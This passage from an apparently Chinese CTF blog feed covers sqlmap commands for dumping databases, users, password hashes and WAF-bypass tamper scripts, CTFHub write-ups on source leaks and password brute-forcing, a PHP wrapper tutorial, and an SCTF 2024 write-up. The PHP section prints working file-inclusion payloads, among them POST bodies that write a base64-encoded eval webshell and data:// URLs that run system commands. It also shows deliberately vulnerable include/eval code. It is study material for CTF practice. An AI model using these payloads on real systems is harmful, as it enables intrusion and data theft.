--dump<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ecd1d24e4e0bdbdb1ba798726e6e77cf.png" alt="在这里插入图片描述"></p><p>获取指定库中所有表的数据。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ --dump<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d480d1cd9e20ab969260167879358341.png" alt="在这里插入图片描述"></p><p>默认获取表中的所有数据，可以使用 --start --stop 指定开始和结束的行，只获取一部分数据。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ -T ‘users’ --start 1 --stop 5  --dump<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e45e5376ea29c75c80d3e87297370046.png" alt="在这里插入图片描述"></p><p>6、获取用户<br>6.1、获取当前登录数据库的用户</p><p>sqlmap -u ‘<a href="http://192.168.31.180/sqli-labs-master/Less-1/?id=1">http://192.168.31.180/sqli-labs-master/Less-1/?id=1</a>’ --current-user<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0f0ae3b919b625e53dfe30aa705fb322.png" alt="在这里插入图片描述"></p><p>最后面显示当前登录数据库的用户是 root@localhost。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dce01c43d07d1b778b6336b24ab774ed.png" alt="在这里插入图片描述"></p><p>6.2、获取所有用户</p><p>–users 获取数据库的所有用户名。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --users<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9d541ae654c75a6b45bdca4956c69e70.png" alt="在这里插入图片描述"></p><p>最后面显示数据库的所有用户名。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f1eb8ad5e8f00a10b3ea7a303559cc7f.png" alt="在这里插入图片描述"></p><p>6.3、获取用户密码</p><p>–passwords 获取所有数据库用户的密码（哈希值）。</p><p>数据库不存储明文密码，只会将密码加密后，存储密码的哈希值，所以这里只能查出来哈希值；当然，你也可以借助工具把它们解析成明文。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebad8785668740e1c0007c260b93fac2.png" alt="在这里插入图片描述"></p><p>最后面显示数据库用户名对应的密码（哈希值）。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/83d4aba88e0edcb7ac8dfd27a14fc126.png" alt="在这里插入图片描述"></p><p>6.4、获取用户权限</p><p>–privileges 查看每个数据库用户都有哪些权限。</p><p>sqlmap -u ‘<a href="http://192.168.31.180/sqli-labs-master/Less-1/?id=1">http://192.168.31.180/sqli-labs-master/Less-1/?id=1</a>’ --privileges<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7f0d13d348c5808f35bce7ac3fb8c789.png" alt="在这里插入图片描述"></p><p>最后面显示每个数据库用户所拥有的权限。这里root的权限最多，很明显它就是数据库的管理员账号。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9e82023aba3b2ba54cf68e08170df323.png" alt="在这里插入图片描述"></p><p>6.5、判断当前用户是不是管理员</p><p>–is-dba 判断当前登录的用户是不是数据库的管理员账号。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --is-dba<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/49cc910b7a95c7bf683f755fd29d4643.png" alt="在这里插入图片描述"></p><p>如果是管理员，就在最后面显示 true。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/30bf8aefb915a4a5e04756fe0eb14a48.png" alt="在这里插入图片描述"></p><p>7、获取主机名<br>–hostname 获取服务器主机名。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --hostname<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1db165db1e031427e4f28167ad1d0f8d.png" alt="在这里插入图片描述"></p><p>最后面显示服务器的主机名是 DESKTOP。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d5af455c6d16ff03f3b8cd6abbf5e92a.png" alt="在这里插入图片描述"></p><p>8、搜索库、表、字段。<br>–search 搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。</p><p>搜索数据库中有没有 security 这个数据库：</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ --search<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c0352f71a931992007a5131210176ce2.png" alt="在这里插入图片描述"></p><p>需要手动选择模糊匹配（1）还是完全匹配（2），而后返回匹配的结果。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b3ff66fa096a1dd0ea3ac3fb8d8ff188.png" alt="在这里插入图片描述"></p><p>也可以搜索表</p><p>sqlmap -u ‘<a href="http://xxx/?id=1">http://xxx/?id=1</a>’ -T ‘users’ --search</p><p>或者搜索字段</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -C ‘username’ --search</p><p>9、正在执行的SQL语句<br>–statements 获取数据库中正在执行的SQL语句。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --statements<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/cad70c65b23e12ad93624f81019c8cfa.png" alt="在这里插入图片描述"></p><p>最后面显示正在执行的SQL语句。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9e14994f2b5460205c132ff90d3e79e6.png" alt="在这里插入图片描述"></p><p>三、WAF绕过<br>–tamper 指定绕过脚本，绕过WAF或ids等。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --tamper ‘<a href="http://space2comment.py">space2comment.py</a>’<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b03fed1f5f8b5b7a804af437393e61a4.png" alt="在这里插入图片描述"></p><p>SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c547aee553de76dc5d54f8658d10d7d2.png" alt="在这里插入图片描述"></p><p>脚本按照用途命名，比如 <a href="http://space2comment.py">space2comment.py</a> 是指，用/**/代替空格。</p><p>当然，你也可以根据内置脚本格式，自己定义绕过脚本。</p><p>三、其他<br>–batch （默认确认）不再询问是否确认。</p><p>–method=GET 指定请求方式（GET/POST）</p><p>–random-agent 随机切换UA（User-Agent）</p><p>–user-agent ’ ’ 使用自定义的UA（User-Agent）</p><p>–referer ’ ’ 使用自定义的 referer</p><p>–proxy=“127.0.0.1:8080” 指定代理</p><p>–threads 10 设置线程数，最高10</p><p>–level=1 执行测试的等级（1-5，默认为1，常用3）</p><p>–risk=1 风险级别（0~3，默认1，常用1），级别提高会增加数据被篡改的风险。</p><p>sqlmap绕过脚本模块使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xxx.com&#x27; --tamper [模块名]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.10.26</title>
      <link href="/posts/790be4e8.html"/>
      <url>/posts/790be4e8.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>来源：CTFHUB</p></blockquote><h4 id="SVN泄露">SVN泄露</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026143331724.png" alt="image-20241026143331724"></p><blockquote><p>扫描一下目录，发现有/svn，所以是svn泄露</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026152141560.png" alt="image-20241026152141560"></p><blockquote><p>使用工具dvcs-ripper将泄露的文件下载到本地目录中</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026152300541.png" alt="image-20241026152300541"></p><blockquote><p>先用 ls -al 查看，再转到.svn文件夹中查看下载的文件。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026152505737.png" alt="image-20241026152505737"></p><blockquote><p>根据题目可知，在旧版服务器，所以访问pristime文件夹，在其中找到了flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026153044983.png" alt="image-20241026153044983"></p><blockquote><p>ctfhub{4e0bf99268e971a228b50696}</p></blockquote><h4 id="HG泄露">HG泄露</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026153720698.png" alt="image-20241026153720698"></p><blockquote><p>先扫描目录，发现.hg文件，所以是hg文件泄露</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026154228171.png" alt="image-20241026154228171"></p><blockquote><p>将文件下载到本地</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026155713885.png" alt="image-20241026155713885"></p><blockquote><p>查看内容</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026155739491.png" alt="image-20241026155739491"></p><blockquote><p>打开看到的.txt文件，发现添加了flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026155829484.png" alt="image-20241026155829484"></p><blockquote><p>使用正则表达式匹配flag</p><p>grep -a -r flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026160139201.png" alt="image-20241026160139201"></p><blockquote><p>发现一个.txt文件名路径，打开发现flag</p><p><a href="http://challenge-f5d5a98ec092b9ff.sandbox.ctfhub.com:10800/flag_2461926440.txt">http://challenge-f5d5a98ec092b9ff.sandbox.ctfhub.com:10800/flag_2461926440.txt</a></p></blockquote><blockquote><p>ctfhub{28354671de5448e69f93511c}</p></blockquote><h4 id="弱口令">弱口令</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171134560.png" alt="image-20241026171134560"></p><blockquote><p>进行爆破，选择集束炸弹</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171232301.png" alt="image-20241026171232301"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171247068.png" alt="image-20241026171247068"></p><blockquote><p>ctfhub{922a54553d59ecd22800296d}</p></blockquote><h4 id="默认口令">默认口令</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171937965.png" alt="image-20241026171937965"></p><blockquote><p>网络搜索eyou网关默认账号密码，挨着试</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026172024713.png" alt="image-20241026172024713"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171914804.png" alt="image-20241026171914804"></p><blockquote><p>ctfhub{780ed41da21c1e4a55d3962b}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/posts/5a47ecbe.html"/>
      <url>/posts/5a47ecbe.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>php://伪协议是php提供的一些输入输出流访问功能，允许访问php的输入输出流，标准输入输出和错误描述符，内存中，磁盘备份的临时文件流，以及可以操作其他读取和写入文件的过滤器。</p><p>首先看到题目提示传个file，遂/?file=…一个随意参数，而后得到源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;allow_url_include&quot;,&quot;on&quot;);</span><br><span class="line">header(&quot;Content-type: text/html; charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    echo &#x27;flag 在flag.php中&#x27;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;传入一个file试试&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">include_once($file);</span><br><span class="line">?&gt; flag 在flag.php中</span><br></pre></td></tr></table></figure><p>发现有include_once函数；<br>include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。</p><p>于是利用伪协议构造，</p><p>php://filter/convert.base64-encode/resource=flag.php</p><p>得到经过Base64加密的flag，解密即可。</p><h2 id="常见的php伪协议">常见的php伪协议</h2><p>1）file:// 访问本地文件系统</p><p>2）http:// 访问HTTP(S)网址</p><p>3）ftp:// 访问FTP(S)URL</p><p>4)php:// 访问各个输出输入流</p><p>5)zlib:// 处理压缩流</p><p>6)data:// 读取数据</p><p>7)glob:// 查找匹配的文件路径模式</p><p>8)phar:// PHP归档</p><p>9)rar:// RAR数据压缩</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240915150327.png" alt=""></p><h2 id="协议详细：">协议详细：</h2><p>一、环境概要：<br>PHP伪协议指的是PHP所支持的协议与封装协议，在web渗透漏洞利用中常用于配合文件包含进行web攻击，从而获取网站权限。</p><p>1.php.ini配置文件参数：</p><p>allow_url_fopen ：on #默认开启 ，表示允许url里的封装协议访问文件；<br>allow_url_include：off #默认关闭，表示不允许包含url里的封装协议包含文件；<br>2.常用伪协议条件及方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt="在这里插入图片描述"></p><p>3.注意点</p><p>①各个伪协议适用php版本不尽相同，以下php版本在5.2~5.7之间疯狂来回切换，到最后已经无法总结各协议实验成功所使用的php版本。总之：php&gt;5.2.0<br>②以下所有实例均使用Firefox浏览器</p><p>二、伪协议实例</p><h4 id="1-php-input">1.php://input</h4><p>php://input 是可以访问请求原始数据的只读流。在POST 请求的情况下，由于 php://input 不依赖于特定的 php.ini 指令，可以使用它代替 $HTTP_RAW_POST_DATA。</p><p>php://input   (执行post中的命令)</p><p>注意点<br>①input必须以post请求<br>②enctype=“multipart/form-data” 的时候 php://input 是无效的<br>③allow_url_include=on</p><p>实例一：php://input将文件包含漏洞变成代码执行漏洞</p><p>①目标网站存在包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @include($_GET[&quot;file&quot;])?&gt;</span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ipconfig&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt=""></p><p>实例二：php://input利用文件包含写入shell</p><p>①目标网站存在包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @include($_GET[&quot;file&quot;])?&gt;</span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#post方式提交</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行成功会在当前目录下生成一句话shell，可直接连接</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/075dbc6a76924f750b80ef7bcd0a8964.png" alt="在这里插入图片描述"></p><p>实例三：php://input协议直接写入shell</p><p>①含有php://input的代码漏洞文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$data = file_get_contents(&#x27;php://input&#x27;); </span><br><span class="line">eval($data); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>POST直接传参执行php代码：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b14c8e1c01df529a99ef1a94150ba4f7.png" alt="在这里插入图片描述">同理，这里在post数据提交生成shell的代码，会在同级目录下生成shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_put_contents(&quot;ceshi.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ab163614fd0d637a0c968b0d80ba168c.png" alt="在这里插入图片描述"></p><p>需要注意的是，此方法使用条件为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.allow_url_include = On</span><br><span class="line"></span><br><span class="line">2. PHP &gt;= 5.2.0</span><br><span class="line">3. 当前文件有写入权限</span><br></pre></td></tr></table></figure><h4 id="2-data-URL代码执行">2.data:URL代码执行</h4><p>将攻击代码转换为data:URL形式进行攻击，以传递相应格式的数据用来执行PHP代码。为了防止直接在URL连接中的一些敏感字符被waf检测拦截，可将攻击代码进行base64编码。</p><p>#文件包含代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include $_GET[&#x27;file&#x27;]?&gt;   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d8db3c74cf4384ce95fee2a92a3286a.png" alt=""></p><p>条件：allow_url_include = on&amp;allow_url_fopen()=on&amp; PHP &gt;= 5.2.0</p><h4 id="3-php-filter读取源代码">3.php://filter读取源代码</h4><p>php://filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?file=php://filter/read=convert.base64-encode/resource=1.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php(使用base64读取源文件)</span><br></pre></td></tr></table></figure><blockquote><p>有时题目会需要我们必须包含某个字符串<br>技巧是php://filter伪协议可以套一层协议<br>比如我们需要包含woofers这个字符串：php://filter/read=convert.base64-encode/woofers/resource=index</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81ffdc55f82671f8dcb54cf09e267f66.png" alt="在这里插入图片描述"></p><h4 id="4-file-物理路径包含文件">4.file://物理路径包含文件</h4><p>file:// 协议在allow_url_fopen,allow_url_include都为off的情况下也可以正常使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?filename=file:///C:\\phpStudy\\WWW\\fileinclude\\2\\1.txt</span><br></pre></td></tr></table></figure><p>file://机器的IP地址/目录/文件（这个后面不一定需要跟文件，如果只写一个目录的话就是查看该目录下有哪些文件）<br>对于本地机器，机器的IP地址变成127.0.0.1或localhost或干脆什么也不写。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/106b1e158dda18f56b78e9000c5b0dcc.png" alt="在这里插入图片描述"></p><h4 id="5-data-：利用文件包含-data-可进行命令执行">5.data://：利用文件包含&amp;data://可进行命令执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?filename=data://text/plain,%3C?php%20system(%27whoami%27);?%3E</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/42786ed141197be7c7152764d03fb81d.png" alt="在这里插入图片描述"></p><p>data协议就是会把后面的一段字符串当成php代码区执行，所以读取flag.php的文件就可以看到flag了</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>php://data/plain;base64,XXXX（base64编码后的数据）</p><p>data:text/plain,XXX</p><p>可能的编码的问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法：</p><p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。<br>2.添加空格改变base64编码。<br>3.将+号换成%2b<br><strong>其实不需要通过base64编码来实现！！！</strong><br><strong>将</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><strong>改变成url编码。这样浏览器可以识别！</strong></p><h4 id="6-zip-绕过文件包含下的附加后缀">6.zip://绕过文件包含下的附加后缀</h4><p>以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过%00截断进行绕过。但是%00截断在php版本5.3.4之后就失效了，而且还要考虑GPC，限制比较严重。除此之外，可以通过zip协议和phar协议来包含文件，突破附加后缀限制。</p><p>验证包含对象文件后缀是否为jpg，如果是才进行包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;)&#123;</span><br><span class="line">include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>#直接为包含对象添加jpg后缀，然后进行包含</p><?php$file = $_GET['file'];include($file.'.jpg');?><h2 id="绕过方法：">绕过方法：</h2><p>绕过方法：<br>①实战情况下往目标站点上传zip文件，里面压缩着一个jpg格式的php脚本。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/46fab7eacc6b0f867e3e07462fc016e1.png" alt="在这里插入图片描述"></p><p>②构造zip://php.zip#php.jpg，进行zip://伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可getshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7105d73de0cdab6f3d9e995d3e87c295.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF-2024-wp</title>
      <link href="/posts/9f5e663d.html"/>
      <url>/posts/9f5e663d.html</url>
      
        <content type="html"><![CDATA[<h4 id="FixIt">FixIt</h4><blockquote><p>考点：css代码</p></blockquote><blockquote><p>附件之中是一串css代码，编写html代码运行即可</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020230911858.png" alt="image-20241020230911858"></p><blockquote><p>这里发个模板，填充即可</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Pixel&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .pixel-wrap &#123;</span><br><span class="line">            width: 170px;</span><br><span class="line">            height: 170px;</span><br><span class="line">        &#125;</span><br><span class="line">        .pixel &#123;</span><br><span class="line">            width: 1px;</span><br><span class="line">            height: 1px;</span><br><span class="line">            border-radius: 0%;</span><br><span class="line">            box-shadow:</span><br><span class="line">        &#125;</span><br><span class="line">        .pixel-wrap:hover .pixel &#123;</span><br><span class="line">            /* ... 悬停时的样式 ... */</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;pixel-wrap&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;pixel&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>网页之中用光标点一下有图案的地方就会出现二维码，扫一下就出来了。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020231524486.png" alt="image-20241020231524486"></p><h4 id="music-Master">music Master</h4><blockquote><p>碎碎念：这道题死磕也没刻出来</p></blockquote><blockquote><p>首先下载附件是一个mkv文件，用Potplayer播放，发现两个音轨和两个视频轨。</p></blockquote><blockquote><p>先看音轨</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020233803654.png" alt="image-20241020233803654"></p><blockquote><p>对音轨左右声道分别进行SSTV解码，得到两张残缺的二维码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020234040355.png" alt="image-20241020234040355"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020234006589.png" alt="image-20241020234006589"></p><blockquote><p>对第一个二维码扫码，发现是 this is not flag，而第二张不完整，中间定位点正好全没了，故猜测是两张图进行异或操作。将两张图放入PS，图层混合类型选择差值，并将图片反相，即可得到新的码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241021000118649.png" alt="image-20241021000118649"></p><blockquote><p>ps手工修图后扫码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020234921960.png" alt="image-20241020234921960"></p><blockquote><p>得到一串密码，刚开始不知道是什么，先放在一边</p></blockquote><blockquote><p>再看两个视频轨</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020233246189.png" alt="image-20241020233246189"></p><blockquote><p>这是cimbar编码，使用安卓工具 解码 APP：<a href="https://github.com/sz3/cfc/releases/%EF%BC%8C%E6%89%AB%E6%8F%8F%E5%90%8E%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E6%9C%89%E5%AF%86%E7%A0%81%E7%9A%84">https://github.com/sz3/cfc/releases/，扫描后得到一个有密码的</a> 7z 压缩。而密码就是上面得到的。</p></blockquote><blockquote><p>但是很遗憾，我扫码出来后并没有得到zip文件，且无法提取出zip文件，因此不得不放弃了。wp中显示解压缩后用OpenMPT打开，在进行一系列操作可以得到一串base64编码，解码就是flag。</p></blockquote><blockquote><p>这里放上官方wp链接：<a 